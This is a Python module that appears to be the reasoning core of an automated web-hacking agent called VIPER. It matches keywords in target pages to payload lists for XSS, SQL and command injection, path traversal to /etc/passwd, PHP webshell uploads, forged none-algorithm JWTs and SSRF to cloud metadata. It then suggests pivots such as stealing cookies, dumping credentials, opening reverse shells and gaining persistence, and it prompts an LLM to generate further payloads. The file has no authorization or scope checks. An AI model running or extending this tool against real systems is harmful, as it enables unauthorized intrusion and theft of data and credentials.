#!/usr/bin/env python3
"""
VIPER Mind - Adaptive Hacker Reasoning Engine

Not pattern matching. Actual hacker thinking:
- Observe → Hypothesize → Test → Learn
- Chain reasoning across findings
- Adapt strategy based on feedback
- Think multiple steps ahead

This is how hackers actually think.
"""

import json
import random
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
import pickle

HACKAGENT_DIR = Path(__file__).parent
MIND_DIR = HACKAGENT_DIR / "mind"
MIND_DIR.mkdir(exist_ok=True)

MIND_STATE = MIND_DIR / "viper_mind.pkl"
REASONING_LOG = MIND_DIR / "reasoning.jsonl"


class Observation(Enum):
    """What VIPER can observe"""
    HTTP_RESPONSE = "http_response"
    ERROR_MESSAGE = "error_message"
    TECHNOLOGY = "technology"
    INPUT_FIELD = "input_field"
    FILE_PATH = "file_path"
    BEHAVIOR_CHANGE = "behavior_change"
    TIME_DELAY = "time_delay"
    CONTENT_DIFFERENCE = "content_difference"


class Hypothesis(Enum):
    """What VIPER can hypothesize"""
    INJECTABLE = "injectable"
    READABLE = "readable"
    WRITABLE = "writable"
    EXECUTABLE = "executable"
    BYPASSABLE = "bypassable"
    ENUMERABLE = "enumerable"
    LEAKY = "leaky"


@dataclass
class ReasoningStep:
    """A single step in VIPER's reasoning"""
    observation: str
    hypothesis: str
    test: str
    result: str
    confidence: float
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class AttackVector:
    """A potential attack path"""
    name: str
    preconditions: List[str]
    indicators: List[str]
    tests: List[Dict]
    success_indicators: List[str]
    next_steps: List[str]
    confidence: float = 0.5


class HackerMindset:
    """
    Core hacker reasoning patterns.
    
    How hackers actually think:
    1. What does this do? (Understand)
    2. What can go wrong? (Hypothesize)
    3. How can I make it go wrong? (Test)
    4. What does that give me? (Exploit)
    5. What's next? (Pivot)
    """
    
    REASONING_PATTERNS = {
        # Input Handling
        "input_reflection": {
            "trigger": ["<input", "name=", "value="],
            "hypothesis": "Input may be reflected without sanitization",
            "tests": [
                {"payload": "<script>alert(1)</script>", "look_for": "script>alert"},
                {"payload": "{{7*7}}", "look_for": "49"},
                {"payload": "${7*7}", "look_for": "49"},
                {"payload": "' OR '1'='1", "look_for": ["error", "sql", "true"]},
            ],
            "on_success": ["xss", "ssti", "sqli"],
            "confidence": 0.6
        },
        
        # File Operations
        "file_parameter": {
            "trigger": ["file=", "path=", "page=", "doc=", "include=", "load="],
            "hypothesis": "File parameter may allow path traversal",
            "tests": [
                {"payload": "/etc/passwd", "look_for": "root:"},
                {"payload": "....//....//etc/passwd", "look_for": "root:"},
                {"payload": "php://filter/convert.base64-encode/resource=index", "look_for": "PD9waHA"},
                {"payload": "file:///etc/passwd", "look_for": "root:"},
            ],
            "on_success": ["lfi", "rfi", "source_disclosure"],
            "confidence": 0.7
        },
        
        # Command Execution
        "command_context": {
            "trigger": ["ping", "host=", "ip=", "cmd=", "exec=", "system"],
            "hypothesis": "User input may reach command execution",
            "tests": [
                {"payload": ";id", "look_for": "uid="},
                {"payload": "|id", "look_for": "uid="},
                {"payload": "`id`", "look_for": "uid="},
                {"payload": "$(id)", "look_for": "uid="},
                {"payload": ";sleep 5", "look_for": "TIME_DELAY:5"},
            ],
            "on_success": ["rce", "command_injection"],
            "confidence": 0.8
        },
        
        # Authentication
        "auth_mechanism": {
            "trigger": ["login", "password", "session", "cookie", "token", "auth"],
            "hypothesis": "Authentication may be bypassable",
            "tests": [
                {"type": "cookie", "payload": {"admin": "1"}, "look_for": "admin"},
                {"type": "cookie", "payload": {"loggedin": "true"}, "look_for": "welcome"},
                {"type": "header", "payload": {"X-Forwarded-For": "127.0.0.1"}, "look_for": "access"},
                {"type": "param", "payload": "admin'--", "look_for": ["welcome", "dashboard"]},
            ],
            "on_success": ["auth_bypass", "privilege_escalation"],
            "confidence": 0.5
        },
        
        # Information Disclosure  
        "info_leak": {
            "trigger": ["error", "exception", "stack", "debug", "verbose"],
            "hypothesis": "Error handling may leak information",
            "tests": [
                {"payload": "'", "look_for": ["sql", "mysql", "postgres", "oracle"]},
                {"payload": "{{", "look_for": ["jinja", "twig", "template"]},
                {"payload": "${", "look_for": ["java", "spring", "expression"]},
                {"payload": "[]", "look_for": ["array", "index", "type"]},
            ],
            "on_success": ["info_disclosure", "tech_fingerprint"],
            "confidence": 0.7
        },
        
        # Directory/File Discovery
        "hidden_content": {
            "trigger": ["index", "directory", "folder", "listing"],
            "hypothesis": "Hidden files/directories may exist",
            "tests": [
                {"path": "/robots.txt", "look_for": "Disallow"},
                {"path": "/.git/HEAD", "look_for": "ref:"},
                {"path": "/.env", "look_for": ["DB_", "API_", "SECRET"]},
                {"path": "/backup/", "look_for": "Index of"},
                {"path": "/admin/", "look_for": ["login", "panel", "dashboard"]},
                {"path": "/.htaccess", "look_for": ["Rewrite", "Deny", "Allow"]},
            ],
            "on_success": ["sensitive_file", "source_code", "credentials"],
            "confidence": 0.6
        },
        
        # Upload Functionality
        "file_upload": {
            "trigger": ["upload", "file", "attachment", "image", "document"],
            "hypothesis": "File upload may allow malicious files",
            "tests": [
                {"file": "test.php", "content": "<?php echo 'pwned'; ?>", "look_for": "pwned"},
                {"file": "test.php.jpg", "content": "<?php echo 'pwned'; ?>", "look_for": "pwned"},
                {"file": "test.phtml", "content": "<?php echo 'pwned'; ?>", "look_for": "pwned"},
                {"file": ".htaccess", "content": "AddType application/x-httpd-php .txt", "look_for": "pwned"},
            ],
            "on_success": ["webshell", "rce"],
            "confidence": 0.6
        },
        
        # API/Data Access
        "api_access": {
            "trigger": ["api", "json", "xml", "graphql", "rest", "endpoint"],
            "hypothesis": "API may have authorization issues",
            "tests": [
                {"method": "GET", "path": "/api/users", "look_for": ["email", "password", "user"]},
                {"method": "GET", "path": "/api/admin", "look_for": ["admin", "config"]},
                {"method": "POST", "path": "/graphql", "payload": '{"query":"{__schema{types{name}}}"}', "look_for": "types"},
            ],
            "on_success": ["idor", "broken_access_control", "data_exposure"],
            "confidence": 0.5
        },

        # CORS Misconfiguration
        "cors_misconfig": {
            "trigger": ["access-control", "cors", "origin", "api"],
            "hypothesis": "CORS policy may allow unauthorized cross-origin access",
            "tests": [
                {"type": "header", "payload": {"Origin": "https://evil.com"}, "look_for": ["Access-Control-Allow-Origin: https://evil.com"]},
                {"type": "header", "payload": {"Origin": "null"}, "look_for": ["Access-Control-Allow-Origin: null"]},
            ],
            "on_success": ["cors_misconfig", "data_exposure"],
            "confidence": 0.6
        },

        # WebSocket Testing
        "websocket_access": {
            "trigger": ["ws://", "wss://", "websocket", "socket.io", "sockjs"],
            "hypothesis": "WebSocket endpoint may lack authentication or input validation",
            "tests": [
                {"path": "/ws", "look_for": ["upgrade", "websocket"]},
                {"path": "/socket.io/?EIO=4&transport=polling", "look_for": ["sid", "upgrades"]},
            ],
            "on_success": ["websocket_hijack", "data_exposure"],
            "confidence": 0.5
        },

        # Server-Side Template Injection
        "ssti_detection": {
            "trigger": ["template", "render", "jinja", "twig", "freemarker", "thymeleaf"],
            "hypothesis": "Template engine may allow injection for code execution",
            "tests": [
                {"payload": "{{7*7}}", "look_for": "49"},
                {"payload": "${7*7}", "look_for": "49"},
                {"payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "look_for": "uid="},
                {"payload": "#{7*7}", "look_for": "49"},
            ],
            "on_success": ["ssti", "rce"],
            "confidence": 0.7
        },

        # SSRF Detection
        "ssrf_detection": {
            "trigger": ["url=", "fetch", "proxy", "load", "import", "webhook", "callback"],
            "hypothesis": "Server may make requests to attacker-controlled or internal URLs",
            "tests": [
                {"payload": "http://127.0.0.1:22", "look_for": ["SSH", "OpenSSH"]},
                {"payload": "http://169.254.169.254/latest/meta-data/", "look_for": ["ami-id", "instance"]},
                {"payload": "file:///etc/passwd", "look_for": "root:"},
            ],
            "on_success": ["ssrf", "internal_access", "data_exposure"],
            "confidence": 0.6
        },

        # JWT Weakness
        "jwt_weakness": {
            "trigger": ["jwt", "bearer", "eyJ", "authorization", "token"],
            "hypothesis": "JWT implementation may have algorithm confusion or weak secret",
            "tests": [
                {"type": "header", "payload": {"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0."}, "look_for": ["admin", "welcome", "dashboard"]},
            ],
            "on_success": ["auth_bypass", "jwt_none_alg"],
            "confidence": 0.5
        },
    }
    
    PIVOT_STRATEGIES = {
        "lfi": [
            "Read /etc/passwd to enumerate users",
            "Read application source code for hardcoded credentials",
            "Read log files for session tokens",
            "Try log poisoning for RCE",
            "Read .bash_history for commands/passwords"
        ],
        "sqli": [
            "Enumerate database structure",
            "Dump user credentials",
            "Try file read via LOAD_FILE()",
            "Try file write via INTO OUTFILE",
            "Check for stacked queries for command execution"
        ],
        "xss": [
            "Steal session cookies",
            "Capture keystrokes",
            "Perform actions as victim",
            "Redirect to phishing page",
            "Exploit browser vulnerabilities"
        ],
        "rce": [
            "Enumerate system users",
            "Check for SUID binaries",
            "Look for credentials in config files",
            "Establish reverse shell",
            "Pivot to internal network"
        ],
        "auth_bypass": [
            "Access admin functionality",
            "View other users' data",
            "Modify application settings",
            "Create admin accounts",
            "Access sensitive endpoints"
        ],
        "webshell": [
            "Execute system commands",
            "Read sensitive files",
            "Establish persistence",
            "Pivot to database",
            "Scan internal network"
        ],
        "ssti": [
            "Escalate to remote code execution via template gadgets",
            "Read application configuration and secrets",
            "Access internal services via SSRF through template",
            "Dump environment variables",
            "Enumerate file system"
        ],
        "ssrf": [
            "Access cloud metadata (169.254.169.254)",
            "Scan internal network ports",
            "Access internal admin panels",
            "Read local files via file:// protocol",
            "Attack internal services (Redis, Memcached)"
        ],
        "idor": [
            "Enumerate all user accounts",
            "Access admin user data",
            "Modify other users' settings",
            "Download sensitive files belonging to others",
            "Chain with CSRF for account takeover"
        ],
        "cors_misconfig": [
            "Steal authenticated user data cross-origin",
            "Perform actions as victim via CORS",
            "Exfiltrate API tokens and session data",
            "Chain with XSS for full account takeover"
        ],
        "jwt_none_alg": [
            "Forge admin JWT tokens",
            "Bypass role-based access control",
            "Access admin API endpoints",
            "Impersonate any user"
        ],
        "info_disclosure": [
            "Identify exact software versions for CVE matching",
            "Find internal paths and filenames",
            "Discover database structure from errors",
            "Map internal network topology from stack traces"
        ],
    }


class ViperMind:
    """
    VIPER's adaptive reasoning engine.
    
    Thinks like a hacker:
    - Observes target behavior
    - Forms hypotheses about vulnerabilities
    - Designs tests to prove/disprove
    - Adapts based on results
    - Chains findings into attack paths
    """
    
    def __init__(self):
        self.mindset = HackerMindset()
        self.observations: List[Dict] = []
        self.hypotheses: List[Dict] = []
        self.confirmed: List[str] = []
        self.reasoning_chain: List[ReasoningStep] = []
        self.attack_surface: Dict[str, float] = {}  # Vector -> confidence
        self.adaptation_history: List[Dict] = []
        
        self._load_state()
    
    def _load_state(self):
        if MIND_STATE.exists():
            with open(MIND_STATE, 'rb') as f:
                state = pickle.load(f)
                self.observations = state.get('observations', [])[-1000:]
                self.confirmed = state.get('confirmed', [])
                self.attack_surface = state.get('attack_surface', {})
                self.adaptation_history = state.get('adaptation_history', [])[-500:]
    
    def save_state(self):
        with open(MIND_STATE, 'wb') as f:
            pickle.dump({
                'observations': self.observations[-1000:],
                'confirmed': self.confirmed,
                'attack_surface': self.attack_surface,
                'adaptation_history': self.adaptation_history[-500:]
            }, f)
    
    def observe(self, context: Dict) -> List[str]:
        """
        Observe target and identify interesting patterns.
        Returns list of triggered reasoning patterns.
        """
        triggered = []
        content = context.get('content', '').lower()
        url = context.get('url', '').lower()
        headers = context.get('headers', {})
        
        combined = f"{content} {url} {json.dumps(headers).lower()}"
        
        for pattern_name, pattern in self.mindset.REASONING_PATTERNS.items():
            for trigger in pattern['trigger']:
                if trigger.lower() in combined:
                    triggered.append(pattern_name)
                    self.observations.append({
                        'timestamp': datetime.now().isoformat(),
                        'pattern': pattern_name,
                        'trigger': trigger,
                        'context_snippet': combined[:200]
                    })
                    break
        
        return list(set(triggered))
    
    async def hypothesize_smart(self, triggered_patterns: List[str],
                                context: Dict = None, llm=None) -> List[Dict]:
        """
        LLM-augmented hypothesis generation.
        Falls back to static pattern matching when no LLM available.
        """
        # Start with pattern-based hypotheses
        hypotheses = self.hypothesize(triggered_patterns)

        # If LLM available and we have few hypotheses, ask for more
        if llm and llm.has_direct_api and len(hypotheses) < 3 and context:
            try:
                result = await llm._call_claude(
                    system=(
                        "You are a penetration tester. Given observations about a web target, "
                        "generate testable security hypotheses. Output valid JSON only."
                    ),
                    user=(
                        f"Observations: {json.dumps(context, default=str)[:2000]}\n"
                        f"Existing hypotheses: {[h['hypothesis'] for h in hypotheses]}\n\n"
                        "Generate 2-3 additional security hypotheses with test payloads. "
                        'Output JSON array: [{"hypothesis": "...", "tests": [{"payload": "...", "look_for": "..."}], '
                        '"confidence": 0.0, "on_success": ["vuln_type"]}]'
                    ),
                    max_tokens=512,
                )
                if result:
                    import re as _re
                    match = _re.search(r'\[.*\]', result, _re.DOTALL)
                    if match:
                        llm_hyps = json.loads(match.group())
                        for h in llm_hyps:
                            hypotheses.append({
                                'pattern': 'llm_generated',
                                'hypothesis': h.get('hypothesis', ''),
                                'tests': h.get('tests', []),
                                'on_success': h.get('on_success', []),
                                'confidence': h.get('confidence', 0.5),
                            })
            except Exception:
                pass

        hypotheses.sort(key=lambda x: x.get('confidence', 0), reverse=True)
        self.hypotheses = hypotheses
        return hypotheses

    def hypothesize(self, triggered_patterns: List[str]) -> List[Dict]:
        """
        Form hypotheses based on observations.
        Returns list of testable hypotheses.
        """
        hypotheses = []

        for pattern_name in triggered_patterns:
            pattern = self.mindset.REASONING_PATTERNS.get(pattern_name)
            if pattern:
                hypotheses.append({
                    'pattern': pattern_name,
                    'hypothesis': pattern['hypothesis'],
                    'tests': pattern['tests'],
                    'on_success': pattern['on_success'],
                    'confidence': pattern['confidence']
                })

        # Sort by confidence
        hypotheses.sort(key=lambda x: x['confidence'], reverse=True)
        self.hypotheses = hypotheses

        return hypotheses
    
    def design_test(self, hypothesis: Dict) -> Dict:
        """
        Design a test to prove/disprove hypothesis.
        Returns test specification.
        """
        tests = hypothesis.get('tests', [])
        if not tests:
            return {}
        
        # Pick test based on confidence and previous results
        # Prioritize tests that haven't been tried
        for test in tests:
            test_key = f"{hypothesis['pattern']}:{json.dumps(test)}"
            if test_key not in [h.get('test_key') for h in self.adaptation_history]:
                return {
                    'test_key': test_key,
                    'pattern': hypothesis['pattern'],
                    'test': test,
                    'expected_success': hypothesis['on_success'],
                    'confidence': hypothesis['confidence']
                }
        
        # All tried, pick random
        return {
            'test_key': f"{hypothesis['pattern']}:{json.dumps(random.choice(tests))}",
            'pattern': hypothesis['pattern'],
            'test': random.choice(tests),
            'expected_success': hypothesis['on_success'],
            'confidence': hypothesis['confidence']
        }
    
    def evaluate_result(self, test: Dict, response: str, status: int) -> Tuple[bool, float, List[str]]:
        """
        Evaluate test result.
        Returns (success, confidence_delta, confirmed_vulns)
        """
        look_for = test['test'].get('look_for', [])
        if isinstance(look_for, str):
            look_for = [look_for]
        
        response_lower = response.lower()
        confirmed = []
        
        for marker in look_for:
            if marker.lower() in response_lower:
                # Found indicator!
                confirmed = test.get('expected_success', [])
                
                # Log reasoning
                step = ReasoningStep(
                    observation=f"Tested {test['pattern']} with payload",
                    hypothesis=f"Target may be vulnerable to {test['pattern']}",
                    test=json.dumps(test['test']),
                    result=f"Found marker: {marker}",
                    confidence=test['confidence']
                )
                self.reasoning_chain.append(step)
                
                # Update attack surface
                for vuln in confirmed:
                    self.attack_surface[vuln] = self.attack_surface.get(vuln, 0) + test['confidence']
                    if vuln not in self.confirmed:
                        self.confirmed.append(vuln)
                
                return True, 0.1, confirmed
        
        # Test failed
        self.adaptation_history.append({
            'timestamp': datetime.now().isoformat(),
            'test_key': test.get('test_key'),
            'success': False
        })
        
        return False, -0.05, []
    
    def adapt_strategy(self, confirmed_vulns: List[str]) -> List[str]:
        """
        Adapt strategy based on confirmed vulnerabilities.
        Returns list of recommended next steps.
        """
        next_steps = []
        
        for vuln in confirmed_vulns:
            pivots = self.mindset.PIVOT_STRATEGIES.get(vuln, [])
            next_steps.extend(pivots)
        
        return list(set(next_steps))
    
    def reason(self, context: Dict) -> Dict:
        """
        Full reasoning cycle:
        Observe → Hypothesize → Plan → Return action
        """
        # Step 1: Observe
        triggered = self.observe(context)
        
        if not triggered:
            # Nothing obvious, try common checks
            triggered = ['hidden_content', 'info_leak']
        
        # Step 2: Hypothesize
        hypotheses = self.hypothesize(triggered)
        
        if not hypotheses:
            return {'action': 'enumerate', 'reason': 'No clear attack vector, enumerate more'}
        
        # Step 3: Pick best hypothesis and design test
        best_hypothesis = hypotheses[0]
        test = self.design_test(best_hypothesis)
        
        return {
            'action': 'test',
            'pattern': best_hypothesis['pattern'],
            'hypothesis': best_hypothesis['hypothesis'],
            'test': test,
            'confidence': best_hypothesis['confidence'],
            'reason': f"Testing hypothesis: {best_hypothesis['hypothesis']}"
        }
    
    def get_attack_surface(self) -> Dict:
        """Get current understanding of attack surface"""
        return {
            'confirmed_vulns': self.confirmed,
            'confidence_map': self.attack_surface,
            'observations': len(self.observations),
            'hypotheses_tested': len(self.adaptation_history),
            'reasoning_steps': len(self.reasoning_chain)
        }
    
    def think_ahead(self, current_vuln: str, depth: int = 3) -> List[str]:
        """
        Think multiple steps ahead.
        What can we do with this vulnerability?
        """
        # Mapping from pivot descriptions to next vuln types for chaining
        PIVOT_TO_VULN = {
            'rce': 'rce', 'command': 'rce', 'shell': 'rce', 'execute': 'rce',
            'credential': 'auth_bypass', 'password': 'auth_bypass', 'login': 'auth_bypass',
            'session': 'xss', 'cookie': 'xss', 'steal': 'xss',
            'internal': 'ssrf', 'pivot': 'ssrf', 'network': 'ssrf', 'scan': 'ssrf',
            'file': 'lfi', 'read': 'lfi', 'source': 'lfi',
            'database': 'sqli', 'dump': 'sqli', 'enumerate': 'sqli',
            'admin': 'auth_bypass', 'account': 'idor', 'user': 'idor',
            'config': 'info_disclosure', 'environment': 'info_disclosure',
            'token': 'jwt_none_alg', 'jwt': 'jwt_none_alg',
            'metadata': 'ssrf', 'cloud': 'ssrf',
            'template': 'ssti', 'inject': 'ssti',
        }

        chain = []
        current = current_vuln
        visited = {current}

        for _ in range(depth):
            pivots = self.mindset.PIVOT_STRATEGIES.get(current, [])
            if not pivots:
                break

            # Pick best pivot we haven't already explored
            next_step = pivots[0]
            chain.append(next_step)

            # Map to next vuln type via keyword matching
            next_vuln = None
            for keyword, vuln_type in PIVOT_TO_VULN.items():
                if keyword in next_step.lower() and vuln_type not in visited:
                    next_vuln = vuln_type
                    break

            if next_vuln:
                visited.add(next_vuln)
                current = next_vuln
            else:
                break

        return chain
    
    def explain_reasoning(self) -> str:
        """Explain current reasoning in human terms"""
        if not self.reasoning_chain:
            return "No reasoning steps yet. Need to observe target first."
        
        explanation = "My reasoning so far:\n\n"
        
        for i, step in enumerate(self.reasoning_chain[-5:], 1):
            explanation += f"{i}. Observed: {step.observation}\n"
            explanation += f"   Hypothesized: {step.hypothesis}\n"
            explanation += f"   Tested: {step.test[:100]}...\n"
            explanation += f"   Result: {step.result}\n"
            explanation += f"   Confidence: {step.confidence:.0%}\n\n"
        
        if self.confirmed:
            explanation += f"Confirmed vulnerabilities: {', '.join(self.confirmed)}\n"
        
        if self.attack_surface:
            top = sorted(self.attack_surface.items(), key=lambda x: x[1], reverse=True)[:3]
            explanation += f"Top attack vectors: {', '.join([f'{k}({v:.0%})' for k,v in top])}\n"
        
        return explanation


def main():
    """Demo VIPER Mind reasoning"""
    mind = ViperMind()
    
    # Simulate observing a target
    print("=== VIPER Mind Demo ===\n")
    
    # Test context 1: PHP app with input
    context1 = {
        'url': 'http://target.com/index.php?page=home',
        'content': '<html><form action="login.php"><input name="username"><input name="password" type="password"></form><!-- TODO: remove debug mode --></html>',
        'headers': {'Server': 'Apache/2.4.41', 'X-Powered-By': 'PHP/7.4.3'}
    }
    
    print("Context: PHP app with login form")
    print("-" * 40)
    
    result = mind.reason(context1)
    print(f"Action: {result['action']}")
    print(f"Pattern: {result.get('pattern', 'N/A')}")
    print(f"Hypothesis: {result.get('hypothesis', 'N/A')}")
    print(f"Confidence: {result.get('confidence', 0):.0%}")
    print(f"Reason: {result['reason']}")
    
    print("\n" + "=" * 40 + "\n")
    
    # Simulate finding LFI
    mind.confirmed.append('lfi')
    mind.attack_surface['lfi'] = 0.8
    
    print("After confirming LFI:")
    print("-" * 40)
    
    next_steps = mind.adapt_strategy(['lfi'])
    print("Recommended pivots:")
    for step in next_steps[:3]:
        print(f"  - {step}")
    
    think_ahead = mind.think_ahead('lfi')
    print(f"\nThinking ahead: {' → '.join(think_ahead)}")
    
    print("\n" + "=" * 40 + "\n")
    print("Attack Surface:")
    print(json.dumps(mind.get_attack_surface(), indent=2))
    
    mind.save_state()
    print("\n[+] Mind state saved")


if __name__ == "__main__":
    main()
